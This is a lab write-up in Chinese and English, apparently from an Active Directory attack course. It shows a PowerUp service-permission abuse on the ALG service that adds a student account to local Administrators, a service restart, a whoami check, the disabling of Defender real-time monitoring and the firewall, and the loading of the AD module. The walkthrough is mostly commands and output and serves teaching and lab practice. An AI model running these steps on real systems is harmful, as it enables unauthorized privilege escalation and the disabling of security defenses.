Task
•  Exploit a service on studentx and elevate privileges to local administrator.
•  Identify a machine in the domain where studentuserx has local administrative access due to group membership.

# Exploit a service on studentx and elevate privileges to local administrator.

```
PS C:\AD\Tools> . .\PowerUp.ps1
PS C:\AD\Tools> Invoke-AllChecks
[*] Checking service permissions...


ServiceName   : ALG
Path          : C:\Windows\System32\alg.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'ALG'
CanRestart    : True
```

尝试提权
```
PS C:\AD\Tools> Invoke-ServiceAbuse -Name 'ALG' -UserName 'us\studentuser138'

ServiceAbused Command
------------- -------
ALG           net localgroup Administrators us\studentuser138 /add
```

重启
```
PS C:\AD\Tools>sc.exe stop ALG
PS C:\AD\Tools>sc.exe start ALG
```

sign out以后重新连接，已经是本地administrator权限

```
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name         SID
================= =============================================
us\studentuser138 S-1-5-21-210670787-2521448726-163245708-11628


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
US\managers                                Group            S-1-5-21-210670787-2521448726-163245708-1117 Mandatory group, Enabled by default, Enabled group
US\studentusers                            Group            S-1-5-21-210670787-2521448726-163245708-1116 Mandatory group, Enabled by default, Enabled group
US\maintenanceusers                        Group            S-1-5-21-210670787-2521448726-163245708-1119 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```


关闭wd和防火墙
```
PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.

PS C:\Windows\system32> NetSh Advfirewall set allprofiles state off
Ok.
```

# Identify a machine in the domain where studentuserx has local administrative access due to group membership.

引入ActiveDirectory module


```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\ad\Tools>
```